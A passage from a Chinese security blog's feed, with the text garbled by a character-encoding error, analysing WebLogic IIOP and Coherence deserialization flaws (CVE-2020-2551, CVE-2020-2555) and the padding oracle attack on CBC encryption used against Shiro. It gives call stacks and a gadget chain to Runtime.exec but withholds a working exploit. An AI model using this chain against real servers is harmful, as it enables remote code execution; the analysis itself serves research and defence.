sideéƒ½æ˜¯å®¢æˆ·ç«¯ï¼Œè€Œweblogic(orbd)æ˜¯åœ¨å¤„ç†servant sideçš„æ—¶å€™è§£ææ•°æ®é€ æˆååºåˆ—åŒ–çš„é—®é¢˜ã€‚</p></blockquote><p>åˆ°è¿™é‡Œservant sideçš„æ³¨å†Œå°±ç»“æŸäº†ï¼Œä¸‹é¢æ¥åˆ†æä¸€ä¸‹weblogicæ˜¯å¦‚ä½•å¯¹å…¶è¿›è¡Œè§£æçš„ã€‚</p><h2 id="weblogicè§£ææµç¨‹"><a href="#weblogicè§£ææµç¨‹" class="headerlink" title="weblogicè§£ææµç¨‹"></a>weblogicè§£ææµç¨‹</h2><p>weblogicè§£æè¯·æ±‚çš„å…¥å£å¼€å§‹ï¼šweblogic/rmi/internal/wls/WLSExecuteRequest#run<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632243.jpg" alt="-w895"><br>å®Œæ•´è°ƒç”¨æ ˆåœ¨ä¸‹æ–‡ï¼Œè¿™é‡Œé€‰å–å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„ç‚¹æ¥åˆ†æï¼š<code>weblogic/corba/idl/CorbaServerRef#invoke</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632254.jpg" alt="-w1400"><br>å…ˆæ˜¯åˆ¤æ–­è¯·æ±‚ç±»å‹æ˜¯å¦ä¸º<code>objectMethods</code>å·²ç»å­˜åœ¨çš„ï¼Œè¿™é‡Œæ˜¯<code>rebind_any</code>ï¼Œä¸å­˜åœ¨åˆ™è°ƒç”¨<code>this.delegate._invoke</code>æ–¹æ³•ï¼Œç„¶åå°†æ–¹æ³•ç±»å‹ï¼Œ<code>IIOPInputStream</code>æ•°æ®ä¼ å…¥<code>_invoke</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632264.jpg" alt="-w639"><br><code>rebind_any</code>æŒ‡ä»¤ç±»å‹å¯¹åº”çš„<code>var5</code>ä¸º1ï¼Œè¿›å…¥<code>var2.read_any()</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632272.jpg" alt="-w687"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632280.jpg" alt="-w1221"><br>è¿™é‡Œçš„<code>this.read_TypeCode()</code>å³ä¸Šæ–‡ä¸­Context bindä¸­çš„<code>tk_value</code>è®¾ç½®çš„äº¤äº’ç±»å‹ï¼Œåœ¨<code>weblogic/corba/idl/AnyImpl#read_value_internal</code>å¯¹åº”<code>case 30</code>ï¼ŒåŒæ—¶è¿™é‡Œçš„<code>Any</code>ç±»å‹ï¼Œåœ¨ä¸Šæ–‡<code>Context</code>åˆ†æä¸­æ­£å¼æˆ‘ä»¬å°†åºåˆ—åŒ–æ•°æ®æ’å…¥çš„åœ°æ–¹ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632287.jpg" alt="-w1052"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632294.jpg" alt="-w1449"></p><p>è·Ÿè¿›<code>weblogic/corba/utils/ValueHandlerImpl</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632305.jpg" alt="-w1500"></p><p>åœ¨è¿™é‡Œvar2ä¸º<code>ObjectStreamClass</code>ï¼Œè°ƒç”¨å…¶readObjectæ–¹æ³•ã€‚ç»§ç»­è·Ÿ<code>readObject</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632315.jpg" alt="-w1496"><br>åå°„è°ƒç”¨<code>JtaTransactionManager</code>çš„<code>readObject</code>ï¼š<code>com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632324.jpg" alt="-w1437"><br>æœ€åå°±æ˜¯jndiæ³¨å…¥äº†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632331.jpg" alt="-w1464"></p><p>å®Œæ•´è°ƒç”¨æ ˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632342.jpg" alt="-w820"></p><h1 id="EXPåˆ†æ"><a href="#EXPåˆ†æ" class="headerlink" title="EXPåˆ†æ"></a>EXPåˆ†æ</h1><p>åœ¨åˆ†æEXPæ—¶ä¸ªäººæœ‰ä¸€ç‚¹ç–‘æƒ‘ï¼Œè®°å½•ä¸€ä¸‹åˆ†æå’Œè§£å†³çš„è¿‡ç¨‹ã€‚</p><p>å‚è€ƒ<a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">Y4er/CVE-2020-2551</a>ï¼Œè¿™é‡Œæˆ‘ä»¬ç»“åˆIIOP servant sideçš„demoæ¥çœ‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632353.jpg" alt="-w824"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632362.jpg" alt="-w1144"></p><p>ä¸Šå›¾ä¸ºEXPï¼Œä¸‹å›¾ä¸ºIIOPæœåŠ¡ç«¯ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨demoä¸­<code>HelloImpl</code>ç±»ç»§æ‰¿äº†<code>HelloInterface</code>å®ç°äº†<code>java.rmi.Remote</code>è¿œç¨‹ç±»çš„ç»§æ‰¿ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632369.jpg" alt="-w861"></p><p>å›è¿‡å¤´æ¥çœ‹<code>JtaTransactionManager</code>ç±»çš„æ¥å£ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632379.jpg" alt="-w1492"><br>æ­£æ˜¯è¿™ä¸ªåŸå› æ‰éœ€è¦æˆ‘ä»¬åœ¨ç¼–å†™EXPçš„æ—¶å€™ï¼Œéœ€è¦å°†<code>jtaTransactionManager</code>é€šè¿‡åå°„ï¼ŒåŠ¨æ€è½¬æ¢æˆremoteè¾¾åˆ°è¿œç¨‹è°ƒç”¨çš„ç›®çš„ã€‚</p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>åœ¨è‡ªå·±åŠ¨æ‰‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä¸€ç›´æŠŠweblogicå½“æˆservant sideå’Œorbd(name Service)ï¼Œä¹Ÿæ— æ³•ç†è§£ä¸ºä»€ä¹ˆEXPè¦å’ŒCOBARçš„servant sideä¸€æ ·ç”¨rebindæ³¨å†Œï¼Œåæ¥åœ¨@Lucifaerå¸ˆå‚…çš„å¸®åŠ©ä¸‹æ‰ç†è§£è¿™é‡Œæ²¡æœ‰client sideçš„å‚ä¸ï¼Œè€Œå¯¹äºName Serviceè€Œè¨€è¿™ä¸¤è€…éƒ½æ˜¯å®¢æˆ·ç«¯ã€‚</p><p>å…¶æ¬¡è¿™ç§æ¼æ´IIOPåªæ˜¯è½½ä½“ï¼Œ<code>JtaTransactionManager</code>ä¸ºgadgetï¼Œå®˜æ–¹ä¿®å¤ä¹Ÿä»…ä»…åªæ˜¯æ·»åŠ é»‘åå•ï¼ŒIIOPçš„é—®é¢˜æ²¡æ ¹æœ¬è§£å†³ï¼Œå†çˆ†ä¸€ä¸ªgadgetåˆå¾—ä¿®ï¼Œé—®é¢˜æºæºä¸æ–­ã€‚æ›´å‘çˆ¹çš„æ˜¯å®˜ç½‘ç›´æ¥ä¸‹çš„weblogicè¿é»‘åå•éƒ½æ²¡æœ‰ï¼Œä¸ªäººè§‰å¾—é˜²å¾¡è¿™ç§é—®é¢˜å•çº¯é wafæµé‡æ£€æµ‹æ ¹æœ¬é˜²ä¸ä½ï¼Œæ²¡æœ‰ååºåˆ—åŒ–ç‰¹å¾ï¼ŒäºŒè¿›åˆ¶æ•°æ®æµã€‚è¦é˜²èŒƒè¿™ç±»æ–°é—®é¢˜çš„äº§ç”Ÿï¼Œæˆ–è®¸åªæœ‰RASPçš„è¡Œä¸ºæ£€æµ‹æ‰èƒ½è§£å†³ã€‚</p><p>æœ€åæ„Ÿè°¢@Lucifaerå¸ˆå‚…çš„å¸®åŠ©~</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://paper.seebug.org/1105/" target="_blank" rel="noopener">å…³äº Java ä¸­çš„ RMI-IIOP</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738" target="_blank" rel="noopener">Tutorial: Getting Started Using RMI-IIOP</a></li><li><a href="https://weinan.io/2017/05/03/corba-iiop.html" target="_blank" rel="noopener">An Introduction To The CORBA And Java RMI-IIOP</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html" target="_blank" rel="noopener">Java IDL: IDL to Java Language Mapping</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555ï¼šweblogicååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2020/03/11/CVE-2020-2555%EF%BC%9Aweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/03/11/CVE-2020-2555ï¼šweblogicååºåˆ—åŒ–æ¼æ´åˆ†æ/</id>
    <published>2020-03-11T07:14:00.000Z</published>
    <updated>2020-03-19T12:47:56.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>2020å¹´3æœˆ6æ—¥ï¼ŒOracle Coherence ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-2555ï¼‰çš„ç»†èŠ‚è¢«å…¬å¼€ï¼ŒOracle Coherenceä¸ºOracleèåˆä¸­é—´ä»¶ä¸­çš„äº§å“ï¼Œåœ¨WebLogic 12cåŠä»¥ä¸Šç‰ˆæœ¬ä¸­é»˜è®¤é›†æˆåˆ°WebLogicå®‰è£…åŒ…ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡t3åè®®å‘é€æ„é€ çš„åºåˆ—åŒ–æ•°æ®ï¼Œèƒ½è¿‡é€ æˆå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒå®˜æ–¹å‘çš„è¡¥ä¸å…¬å‘Šï¼š<a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - January 2020 Description</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050324.jpg" alt="-w1191"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050332.jpg" alt="-w1456"></p><p>è¿™é‡Œæˆ‘ä»¬ç”¨12.2.1.4æµ‹è¯•ï¼Œæ‹‰åˆ°ideaä¸­ï¼ŒåŠ¨æ€è°ƒè¯•ç¯å¢ƒå‚è€ƒï¼š<a href="https://0day.design/2020/02/11/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#more">WebLogic-XMLDecoderååºåˆ—åŒ–åˆ†æ</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸»è¦å‚è€ƒè¿™ç¯‡æ–‡ç« æ¥æ„å»ºgadgetsï¼Œ<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLEâ€™S WEBLOGIC SERVER</a></p><p>æ ¹æ®æ–‡ç« æ‰€è¿°çš„sourceç‚¹ï¼Œ<code>cmd + o</code>å¿«é€Ÿå®šä½åˆ°<br><code>/coherence_3.7/lib/coherence.jar!/com/tangosol/util/filter/LimitFilter.class</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050340.jpg" alt="-w1235"><br>æ–‡ç« ä¸­diffçš„å‡½æ•°å°±æ˜¯è¿™ä¸ª<code>toString</code>å‡½æ•°äº†ï¼Œè¡¥ä¸ä¸­å»æ‰äº†è¯¥å‡½æ•°æ‰€æœ‰çš„<code>extractor.extract</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050348.jpg" alt="-w1473"></p><p><code>toString()</code>æ–¹æ³•ï¼Œåœ¨å¾ˆå¤šJREçš„classä¸­<code>readObject</code>æ–¹æ³•éƒ½æœ‰å®ç°ï¼Œæ¯”å¦‚ï¼šjavax/management/BadAttributeValueExpException.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050356.jpg" alt="-w1065"></p><blockquote><p>è¿™ä¸ªç‚¹å’Œcommon-collection5çš„gadgetå¾ˆåƒï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://y4er.com/post/ysoserial-commonscollections-5/" target="_blank" rel="noopener">https://y4er.com/post/ysoserial-commonscollections-5/</a></p></blockquote><p>æ¥ç€å°±æ˜¯å¯»æ‰¾å“ªä¸ªå¯åºåˆ—åŒ–classä¸­çš„æœ‰<code>extract</code>å‡½æ•°ï¼Œä¸”æ–¹ä¾¿æ„é€ å‘½ä»¤æ‰§è¡Œçš„ï¼Œä¸€èˆ¬æ¥è¯´æœ‰è¿™ä¹ˆäº›ç‚¹ï¼š</p><ul><li><code>Runtime.exec()</code></li><li><code>Method.invoke()</code></li><li><code>RMI/JNDI/JRMP</code></li></ul><p>åœ¨<code>com/tangosol/util/extractor/ReflectionExtractor.class</code>ä¸­å®ç°äº†<code>Method.invoke()</code>çš„è°ƒç”¨ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050363.jpg" alt="-w1445"></p><p>è¿™é‡Œè¯»è¿‡<code>common-collection5</code>çš„éƒ½ä¼šç†Ÿæ‚‰ï¼Œæ¥ä¸‹æ¥å°±è¦æ‰¾ä¸€ä¸ªé“¾å¼è°ƒç”¨çš„ç‚¹ï¼Œæ„é€ å‘½ä»¤æ‰§è¡Œ: <code>/com/tangosol/util/extractor/ChainedExtractor.class</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050371.jpg" alt="-w1052"></p><h2 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h2><p>åˆ°è¿™é‡ŒåŸºæœ¬å·²ç»åˆ†æå®Œäº†ï¼ŒEXPç¼–å†™å‚è€ƒè¿™ä¸ªå®Œæˆgadgetè°ƒç”¨é“¾ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">   BadAttributeValueExpException.readObject()</span><br><span class="line">       LimitFilter.toString()</span><br><span class="line">           ChainedExtractor.extract()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Class.getMethod()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Runtime.getRuntime()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªæ¼æ´åŸºæœ¬æ€è·¯å’Œcommon-collectionä¸€æ ·ï¼Œç¼–å†™EXPåªæœ‰ä¸€ç‚¹ç‚¹å·®å¼‚ï¼Œä»”ç»†è¯»ä»£ç ç†è§£è°ƒç”¨å…³ç³»å°±å¥½äº†ï¼Œè¿™é‡Œå°±ä¸å…¬å¼€EXPäº†ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846057050384.jpg" alt="-w1648"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å› ä¸ºæ˜¯å‚è€ƒåˆ†æå†™çš„EXPï¼Œåˆ†ææ–‡ç« ä¸­å…³é”®ç±»çš„ä½ç½®å·²ç»ç»™å‡ºäº†ï¼Œä¸ªäººæ„Ÿè§‰æŒ–æ˜æ¼æ´è¿‡ç¨‹ä¸­æœ€é‡è¦çš„ç‚¹è¿˜æ˜¯å¯»æ‰¾æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹ï¼Œä¹‹åçš„å­¦ä¹ å¾—åœ¨å¯»æ‰¾gadgetè°ƒç”¨å…³ç³»ä¸Šå¤šç ”ç©¶ç ”ç©¶ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Shiro ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2020/03/08/Shiro%20Padding%20Oracle%20Attack%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://0day.design/2020/03/08/Shiro Padding Oracle Attack ååºåˆ—åŒ–/</id>
    <published>2020-03-08T11:02:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>å‚è€ƒ<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/" target="_blank" rel="noopener">ctfwikiä¸­å¯¹CBCæ¨¡å¼çš„ä»‹ç»</a>ï¼Œå…ˆçœ‹ä¸€ä¸‹CBCæ¨¡å¼ä¸‹çš„åŠ è§£å¯†æ¨¡å¼å›¾ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293283.jpg" alt=""></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293291.jpg" alt=""></p><p>ç®€å•æ¦‚æ‹¬ä¸€ä¸‹ï¼ŒåŠ å¯†è¿‡ç¨‹åˆå§‹åŒ–å‘é‡IVå’Œç¬¬ä¸€ç»„æ˜æ–‡è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åç»è¿‡åŠ å¯†ç®—æ³•å¾—åˆ°ç¬¬ä¸€ç»„å¯†æ–‡ï¼Œå¹¶æ‹¿å®ƒä½œä¸ºä¸‹ä¸€åˆ†ç»„åŠ å¯†çš„IVå‘é‡ï¼Œè¿­ä»£ä¸‹å»ã€‚è§£å¯†è¿‡ç¨‹åä¹‹ï¼Œå…ˆè§£å¯†å†å’ŒIVå‘é‡å¼‚æˆ–å¾—åˆ°æ˜æ–‡plaintextã€‚è¿™é‡Œçš„IVå‚æ•°æ˜¯ä¸€ä¸ªéšæœºå€¼(é•¿åº¦å’Œåˆ†ç»„é•¿åº¦ç­‰é•¿)ï¼Œä¸ºäº†ä¿è¯å¤šæ¬¡åŠ å¯†ç›¸åŒæ•°æ®ç”Ÿæˆçš„å¯†æ–‡ä¸åŒè€Œè®¾è®¡çš„ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿åæ–‡æè¿°ï¼Œå°†IVå’ŒPlanttextå¼‚æˆ–åçš„å€¼ç§°ä¸ºä¸­é—´intermediary Valueã€‚</p><p><strong>åˆ†ç»„çš„å¡«å……padding</strong><br>åˆ†ç»„çš„é•¿åº¦ï¼Œä¸åŒåŠ å¯†ç®—æ³•çš„é•¿åº¦å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293298.jpg" alt=""></p><p>åˆ†ç»„å¯†ç (block cipher)éœ€è¦ä¿è¯æ€»é•¿åº¦æ˜¯åˆ†ç»„é•¿åº¦çš„æ•´æ•°å€ï¼Œä½†ä¸€èˆ¬åœ¨æœ€åä¸€ç»„ä¼šå‡ºç°é•¿åº¦ä¸å¤Ÿåˆ†ç»„é•¿åº¦çš„æƒ…å†µï¼Œè¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨paddingå¡«å……ï¼Œå¡«å……çš„è§„åˆ™æ˜¯åœ¨æœ€åå¡«å……ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œå€¼çš„å¤§å°ä¸ºå¡«å……çš„å­—èŠ‚æ€»æ•°ï¼Œå³éœ€æœ€åè¿˜å·®2ä¸ªå­—èŠ‚ï¼Œåˆ™å¡«å……ä¸¤ä¸ª0x02ã€‚ä¸‹è¾¹8ä¸ªå­—èŠ‚çš„å¡«å……èŒƒå›´ä¸º<code>0x01-0x08</code>ã€‚</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293305.jpg" alt=""></p><blockquote><p>è¿™ç§PaddingåŸåˆ™éµå¾ªçš„æ˜¯å¸¸è§çš„PKCS#5æ ‡å‡†ã€‚<a href="https://www.di-mgt.com.au/cryptopad.html#PKCS5" target="_blank" rel="noopener">https://www.di-mgt.com.au/cryptopad.html#PKCS5</a></p></blockquote><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol><li>æ”»å‡»è€…çŸ¥é“å¯†æ–‡å’Œåˆå§‹å‘é‡IV</li><li>paddingé”™è¯¯å’Œpaddingæ­£ç¡®æœåŠ¡å™¨å¯è¿”å›ä¸ä¸€æ ·çš„çŠ¶æ€</li></ol><p><strong>æ”»å‡»æ•ˆæœ</strong><br>æ­£å¸¸CBCè§£å¯†éœ€è¦çŸ¥é“IVã€Keyã€å¯†æ–‡ï¼Œè€Œé€šè¿‡Padding Oracleæ¼æ´ï¼Œåªç”¨çŸ¥é“IVã€å¯†æ–‡å³å¯è·å¾—æ˜æ–‡ã€‚</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>ä»¥è¿™æ ·ä¸€ä¸ªç¨‹åºä¸ºä¾‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E</span><br></pre></td></tr></table></figure></p><p>å‰16ä¸ªå­—æ¯(8å­—èŠ‚)<code>0000000000000000</code>ä¸ºIVï¼Œå32å­—æ¯(16å­—èŠ‚)ä¸ºå¯†æ–‡ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293312.jpg" alt=""></p><p><strong>padding 0x01</strong><br>é€šå¸¸ç¨‹åºæ ¡éªŒpaddingæ˜¯å¦æ­£ç¡®æ˜¯é€šè¿‡æ£€æŸ¥æœ«å°¾çš„é‚£ä¸ªå­—èŠ‚çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹IVçš„å€¼ä½¿å¾—å…¶ä¸ä¸­é—´é‡intermediary Valueå¼‚æˆ–å¾—åˆ°çš„ç»“æœ(plaintext)æœ€åä¸€ä¸ªå­—èŠ‚(å¡«å……ä½)ä¸º0x01ã€‚</p><p>å®ç°è¿™æ ·ä¸€ä¸ªç©·ä¸¾çš„è¿‡ç¨‹ï¼Œéœ€è¦æ”¹å˜IVçš„æœ€åä¸€ä¸ªå­—èŠ‚(æœ€å¤š255æ¬¡)ï¼Œä¸”éœ€è¦æœåŠ¡ç«¯å°†åˆ¤æ–­paddingæ ¡éªŒçš„ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯(ç±»ä¼¼äºå¸ƒå°”æ³¨å…¥çš„é€»è¾‘)ã€‚æ¯”å¦‚åœ¨webåº”ç”¨ä¸­ï¼Œpaddingæ­£ç¡®(è§£å¯†çš„å†…å®¹ä¸æ­£ç¡®)è¿”å›200ï¼Œpaddingé”™è¯¯(è§£å¯†å†…å®¹é”™è¯¯)è¿”å›500ã€‚</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293320.jpg" alt=""></p><p>è‡³æ­¤é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>IV</code>(fuzzå‡ºçš„IV)å’Œ<code>0x01</code>å¼‚æˆ–å¾—åˆ°intermediary Valueä¸­é—´å€¼ã€‚</p><p>åœ¨<em>å•ä¸ªåˆ†ç»„</em>çš„æƒ…å†µä¸‹ï¼Œå…¶å®æˆ‘ä»¬æ‹¿ç€intermediary Valueå’Œ<em>åˆå§‹å‘é‡IV</em>å¼‚æˆ–ï¼Œå³å¯æ‹¿åˆ°æœ€åæ˜æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293327.jpg" alt="-w824"></p><p><strong>padding 0x02</strong><br>æ­¤æ—¶ï¼Œé€šè¿‡ä¿®æ”¹IVç¬¬å…«ä¸ªå­—èŠ‚çš„å€¼ä½¿å¾—æœ€åä¸€ä¸ªpaddingä½å˜æˆ0x02(ä¸Šå›¾ä¸­0x67^0x02=0Ã—64)ï¼Œå†fuzz IVç¬¬ä¸ƒä¸ªå­—èŠ‚ï¼Œä½¿å¾—æœåŠ¡ç«¯è§£å‡ºplaintextå…¶å¡«å……ä½ä¸º0x02ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå…¶å®æ”»å‡»çš„æœ¬è´¨éƒ½æ˜¯ä¸ºäº†å¾—åˆ°ä¸­é—´ä¸´æ—¶å˜é‡intermediary valueï¼Œé€šè¿‡å…¶å’Œåˆå§‹IVè®¡ç®—å‡ºæ˜æ–‡ã€‚</p><p><strong>å¤šåˆ†ç»„å¯†æ–‡æƒ…å†µ</strong><br>ä¸Šé¢è¯´åˆ°çš„Padding Oracle Attackæ˜¯ä»¥å•ä¸ªåˆ†ç»„è¿›è¡Œçš„ï¼Œå¦‚æœå¯†æ–‡æœ‰å¤šä¸ªåˆ†ç»„ï¼Œå…¶æœ€å¤§çš„åŒºåˆ«åœ¨äºè¿™ä¸€åˆ†ç»„åŠ å¯†çš„åˆå§‹IVå‘é‡ä¸ºä¸Šæ¬¡ç»„åŠ å¯†çš„ç»“æœCiphertextã€‚</p><p>åœ¨å¤šåˆ†ç»„å¯†æ–‡ä¸­ï¼Œç”±äºå¯†æ–‡å’ŒIVå·²çŸ¥ä¸”å¯æ§ï¼Œå…ˆæ‹¿ç¬¬ä¸€ç»„paddingçš„æ–¹å¼çˆ†ç ´IVæ¨ç®—intermediary valueï¼Œç„¶åæ ¹æ®åŸå§‹IVè®¡ç®—å‡ºæ˜æ–‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹åŸå§‹IVæ§åˆ¶å¯†æ–‡ç»“æœï¼›å†æ‹¿ç¬¬ä¸€äºŒç»„ï¼Œç”¨paddingçš„æ–¹å¼çˆ†ç ´intermediary valueï¼Œæ­¤æ—¶çš„åˆå§‹IVä¸ºç¬¬ä¸€ç»„çš„å¯†æ–‡ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><h4 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><p>æ¼æ´çš„å…³é”®ç‚¹åœ¨äºæ”»å‡»è€…èƒ½å¤Ÿåˆ¤æ–­å…¶paddingçš„ç»“æœï¼Œåœ¨ä½¿ç”¨CBCæ¨¡å¼çš„åˆ†ç»„åŠ å¯†ç®—æ³•éœ€è¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œæ¯”å¦‚è®©æœåŠ¡ç«¯åŠ ä¸Šå¼‚å¸¸å¤„ç†ç­‰ç­‰ã€‚</p><blockquote><p>å®éªŒä»£ç ï¼š<a href="media/15832217572390/Demo.py">Demo</a></p></blockquote><h3 id="CBCå­—èŠ‚åè½¬"><a href="#CBCå­—èŠ‚åè½¬" class="headerlink" title="CBCå­—èŠ‚åè½¬"></a>CBCå­—èŠ‚åè½¬</h3><p>åœ¨ä¹Œäº‘çŸ¥è¯†åº“é‡Œæœ‰ä¸€ç¯‡æ–‡ç« çš„ä¾‹å­è¯´çš„æ¯”è¾ƒæ¸…æ™°ï¼š<a href="https://drops.xmd5.com/static/drops/tips-7828.html" 